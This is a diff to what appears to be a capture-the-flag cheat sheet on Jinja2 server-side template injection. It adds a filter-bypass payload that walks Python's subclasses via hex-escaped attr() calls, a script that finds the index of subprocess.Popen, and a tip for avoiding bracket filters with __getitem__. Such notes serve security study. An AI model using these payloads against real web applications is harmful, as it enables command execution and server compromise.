@@ -7,6 +7,18 @@ https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
 [Common object/var names added in a template (for fuzzing) use Burp or Zap](https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names)
 [Filter Evasion](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)
 
+# Misc
+Voila bypass was successful after that just search <class ‘subprocess.Popen’> in subclasses, to find out subclasses in the environment we can use {{()|attr(‘\x5f\x5fclass\x5f\x5f’)|attr(‘\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f’)()}} to find out the index of subprocess I usually copy all subclasses into txt and do a for loop in python to guess which subprocess are in the index.
+
+```python
+with open('lol.txt') as p:
+    check = p.read()
+for index,value in enumerate(check.split(',')):
+    if "<class 'subprocess.Popen'>" in value:
+        print(index)
+```
+When it starts, subprocess is found in index 287, but the problem is we can’t use []. We can replace the array [] by using the __ getitem __ method.
+
 ## Writeups
 
 ### Sequel_Sequel (SFTP Jail)
